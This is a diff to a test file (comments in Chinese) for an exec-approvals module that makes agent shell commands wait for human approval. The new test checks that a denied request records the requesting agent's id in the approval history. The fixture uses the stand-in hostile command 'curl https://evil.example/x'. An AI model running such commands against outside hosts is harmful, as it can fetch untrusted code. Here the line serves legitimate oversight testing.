@@ -3,7 +3,7 @@ import { describe, it, expect, beforeEach } from "vitest";
 import { mkdtempSync, rmSync, existsSync, readFileSync } from "fs";
 import { tmpdir } from "os";
 import { join } from "path";
-import { requestApproval, decideApproval, consumeApproval } from "../../packages/server/src/lib/exec-approvals.mjs";
+import { requestApproval, decideApproval, consumeApproval, listApprovalHistory } from "../../packages/server/src/lib/exec-approvals.mjs";
 
 let dir;
 beforeEach(() => {
@@ -11,6 +11,18 @@ beforeEach(() => {
 });
 
 describe("exec-approvals decideApproval", () => {
+  // 2026-10-13：審批屬「發起的那個 agent」— 紀錄要帶 agentId，UI 才能只在該 crew 視窗顯示
+  it("agentId：紀錄帶發起 agent，listApprovalHistory 讀得回來", () => {
+    const cmd = "curl https://evil.example/x";
+    const id = requestApproval(cmd, dir, "外部 URL", "developer");
+    decideApproval(id, "deny");
+    const hist = listApprovalHistory(dir, 10);
+    expect(hist.length).toBe(1);
+    expect(hist[0].agentId).toBe("developer");
+    expect(hist[0].decided).toBe("deny");
+    rmSync(dir, { recursive: true, force: true });
+  });
+
   it("once：決策後同一條指令可消耗一次", () => {
     const cmd = "curl http://evil.example/x";
     const id = requestApproval(cmd, dir, "外部 URL");
